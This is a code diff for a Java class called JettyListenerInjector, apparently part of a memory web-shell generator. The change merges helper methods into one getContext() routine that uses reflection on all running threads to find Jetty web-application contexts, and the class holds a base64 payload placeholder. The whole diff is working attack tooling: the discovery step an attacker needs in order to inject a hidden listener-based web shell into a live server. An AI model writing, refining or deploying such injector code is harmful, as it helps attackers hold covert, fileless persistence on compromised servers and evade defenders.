@@ -43,69 +43,37 @@ public class JettyListenerInjector {
         return "{{base64Str}}";
     }
 
-    List<Object> getContext() {
+    private List<Object> getContext() {
         List<Object> contexts = new ArrayList<Object>();
         Thread[] threads = Thread.getAllStackTraces().keySet().toArray(new Thread[0]);
         for (Thread thread : threads) {
             try {
-                Object contextClassLoader = getContextClassLoader(thread);
-                if (isWebAppClassLoader(contextClassLoader)) {
-                    contexts.add(getContextFromWebAppClassLoader(contextClassLoader));
-                } else if (isHttpConnection(thread)) {
-                    contexts.add(getContextFromHttpConnection(thread));
+                Object contextClassLoader = invokeMethod(thread, "getContextClassLoader");
+                if (contextClassLoader.getClass().getName().contains("WebAppClassLoader")) {
+                    Object context = getFieldValue(contextClassLoader, "_context");
+                    Object handler = getFieldValue(context, "_servletHandler");
+                    contexts.add(getFieldValue(handler, "_contextHandler"));
+                } else {
+                    Object threadLocals = getFieldValue(thread, "threadLocals");
+                    Object table = getFieldValue(threadLocals, "table");
+                    for (int i = 0; i < Array.getLength(table); ++i) {
+                        Object entry = Array.get(table, i);
+                        if (entry != null) {
+                            Object httpConnection = getFieldValue(entry, "value");
+                            if (httpConnection != null && httpConnection.getClass().getName().contains("HttpConnection")) {
+                                Object httpChannel = invokeMethod(httpConnection, "getHttpChannel");
+                                Object request = invokeMethod(httpChannel, "getRequest");
+                                Object session = invokeMethod(request, "getSession");
+                                Object servletContext = invokeMethod(session, "getServletContext");
+                                contexts.add(getFieldValue(servletContext, "this$0"));
+                            }
+                        }
+                    }
                 }
             } catch (Exception ignored) {
             }
         }
         return contexts;
-    }
-
-    private Object getContextClassLoader(Thread thread) throws Exception {
-        return invokeMethod(thread, "getContextClassLoader");
-    }
-
-    private boolean isWebAppClassLoader(Object classLoader) {
-        return classLoader.getClass().getName().contains("WebAppClassLoader");
-    }
-
-    private Object getContextFromWebAppClassLoader(Object classLoader) throws Exception {
-        Object context = getFieldValue(classLoader, "_context");
-        Object handler = getFieldValue(context, "_servletHandler");
-        return getFieldValue(handler, "_contextHandler");
-    }
-
-    private boolean isHttpConnection(Thread thread) throws Exception {
-        Object threadLocals = getFieldValue(thread, "threadLocals");
-        Object table = getFieldValue(threadLocals, "table");
-        for (int i = 0; i < Array.getLength(table); ++i) {
-            Object entry = Array.get(table, i);
-            if (entry != null) {
-                Object httpConnection = getFieldValue(entry, "value");
-                if (httpConnection != null && httpConnection.getClass().getName().contains("HttpConnection")) {
-                    return true;
-                }
-            }
-        }
-        return false;
-    }
-
-    private Object getContextFromHttpConnection(Thread thread) throws Exception {
-        Object threadLocals = getFieldValue(thread, "threadLocals");
-        Object table = getFieldValue(threadLocals, "table");
-        for (int i = 0; i < Array.getLength(table); ++i) {
-            Object entry = Array.get(table, i);
-            if (entry != null) {
-                Object httpConnection = getFieldValue(entry, "value");
-                if (httpConnection != null && httpConnection.getClass().getName().contains("HttpConnection")) {
-                    Object httpChannel = invokeMethod(httpConnection, "getHttpChannel");
-                    Object request = invokeMethod(httpChannel, "getRequest");
-                    Object session = invokeMethod(request, "getSession");
-                    Object servletContext = invokeMethod(session, "getServletContext");
-                    return getFieldValue(servletContext, "this$0");
-                }
-            }
-        }
-        throw new Exception("HttpConnection not found");
     }
 
     @SuppressWarnings("all")
